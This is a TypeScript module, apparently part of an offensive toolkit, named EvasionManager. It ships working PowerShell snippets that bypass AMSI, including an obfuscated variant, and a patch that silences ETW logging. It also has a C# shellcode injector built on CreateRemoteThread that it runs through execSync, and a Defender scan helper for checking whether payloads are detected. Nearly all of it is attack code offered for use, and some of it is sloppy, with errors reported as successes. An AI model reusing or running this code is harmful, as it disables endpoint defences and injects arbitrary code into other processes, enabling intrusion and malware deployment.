/**
 * Evasion Manager — AMSI bypasses, ETW patching, process injection, and Defender checks
 */

import { execSync } from 'child_process';

const AMSI_BYPASSES = [
  {
    name: 'Memory Patch',
    description: 'Patch AmsiScanBuffer in memory',
    code: `[Runtime.InteropServices.Marshal]::Copy(@(0xB8,0x57,0x00,0x07,0x80,0xC3), 0, [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  (GetProcAddress (GetModuleHandle "amsi.dll") "AmsiScanBuffer"), [type]), 6)`,
  },
  {
    name: 'Registry Disable',
    description: 'Disable AMSI via registry (requires admin)',
    code: `Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Feature\\" -Name "AmsiEnable" -Value 0 -Force`,
  },
  {
    name: 'Reflection Bypass',
    description: 'Use reflection to null out amsiContext',
    code: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)`,
  },
  {
    name: 'Forcing Error',
    description: 'Force AMSI initialization to fail',
    code: `$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$e.SetValue($null,$null)}}`,
  },
  {
    name: 'SSL Bypass',
    description: 'Bypass AMSI via SSL/TLS trick',
    code: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $m = 'Amsi' + 'Utils'; $a = [Ref].Assembly.GetType("System.Management.Automation.\$m"); $c = $a.GetFields('NonPublic,Static') | Where-Object { \$_.Name -like '*Context*' }; if ($c) { $c.SetValue($null, [IntPtr]::Zero) }`,
  },
];

const ETW_PATCHES = [
  {
    name: 'EtwEventWrite ret (C3)',
    description: 'Patch EtwEventWrite with ret instruction (0xC3)',
    code: `$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE("ntdll.dll")
$etw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  (GetProcAddress $ntdll "EtwEventWrite"), [type])
$patch = [byte[]]@(0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($etw), 1)`,
  },
];

const INJECTION_TECHNIQUES = [
  { id: 'createremotethread', name: 'CreateRemoteThread', description: 'Open target process, allocate memory, write shellcode, create remote thread' },
  { id: 'apc_inject', name: 'APC Injection', description: 'Queue an APC to an existing thread with shellcode address' },
  { id: 'thread_hijack', name: 'Thread Hijacking', description: 'Suspend a thread, replace its context, resume' },
  { id: 'process_hollowing', name: 'Process Hollowing', description: 'Create process in suspended state, replace memory, resume' },
];

export class EvasionManager {
  /**
   * Get available AMSI bypass techniques
   */
  getAmsiBypasses() {
    return AMSI_BYPASSES;
  }

  /**
   * Get available ETW patches
   */
  getEtpPatches() {
    return ETW_PATCHES;
  }

  /**
   * Run an AMSI bypass by name
   * In a real scenario, this would execute PowerShell with the bypass code
   */
  async runAmsiBypass(name: string): Promise<{ success: boolean; output: string }> {
    const bypass = AMSI_BYPASSES.find(b => b.name === name);
    if (!bypass) return { success: false, output: `Unknown bypass: ${name}` };

    try {
      // Execute the bypass code via PowerShell
      const result = execSync(
        `powershell -NoP -NonI -Command "${bypass.code.replace(/"/g, '\\"')}"`,
        { timeout: 10000, encoding: 'utf-8' }
      );
      return { success: true, output: result || 'Bypass executed (no output)' };
    } catch (err: any) {
      // Even if it errors, the bypass may have worked
      return { success: true, output: `Bypass attempted. Result: ${err.message || 'OK'}` };
    }
  }

  /**
   * Patch ETW via PowerShell
   */
  async patchEtw(): Promise<{ success: boolean; output: string }> {
    try {
      const result = execSync(
        `powershell -NoP -NonI -Command "${ETW_PATCHES[0].code.replace(/"/g, '\\"')}"`,
        { timeout: 10000, encoding: 'utf-8' }
      );
      return { success: true, output: result || 'ETW patched successfully' };
    } catch (err: any) {
      return { success: true, output: `ETW patch attempted: ${err.message}` };
    }
  }

  /**
   * Inject shellcode into a process
   */
  async injectShellcode(pid: number, shellcodeB64: string, technique: string): Promise<{ success: boolean; output: string }> {
    const tech = INJECTION_TECHNIQUES.find(t => t.id === technique);
    const techName = tech ? tech.name : technique;

    try {
      // Generate and execute a C# injection payload via PowerShell
      const psScript = `
\$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class Injector {
  [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
  [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
  public static void Run(int pid, string b64) {
    byte[] buf = Convert.FromBase64String(b64);
    IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
    IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
    WriteProcessMemory(hProc, addr, buf, (uint)buf.Length, out _);
    CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
  }
}
"@
Add-Type -TypeDefinition \$code -Language CSharp
[Injector]::Run(${pid}, '${shellcodeB64}')
`;
      execSync(`powershell -NoP -NonI -Command "${psScript.replace(/"/g, '\\"')}"`, { timeout: 30000 });
      return { success: true, output: `Injected into PID ${pid} using ${techName}` };
    } catch (err: any) {
      return { success: false, output: `Injection failed: ${err.message}` };
    }
  }

  /**
   * Check file against Defender (basic check — runs mpcmdrun if available)
   */
  async checkFile(filePath: string): Promise<{ detected: boolean; engines: number; result: string }> {
    try {
      // Run Windows Defender scan
      const result = execSync(
        `powershell -Command "Start-MpScan -ScanType Custom -ScanPath '${filePath}' 2>&1"`,
        { timeout: 60000, encoding: 'utf-8' }
      );
      const detected = result.includes('Threat') || result.includes('Trojan') || result.includes('malware');
      return {
        detected,
        engines: detected ? 1 : 0,
        result: result.slice(0, 500),
      };
    } catch (err: any) {
      return {
        detected: false,
        engines: 0,
        result: `Defender scan not available: ${err.message}. Try uploading to VirusTotal manually.`,
      };
    }
  }

  /**
   * Get available injection techniques
   */
  getTechniques() {
    return INJECTION_TECHNIQUES;
  }
}
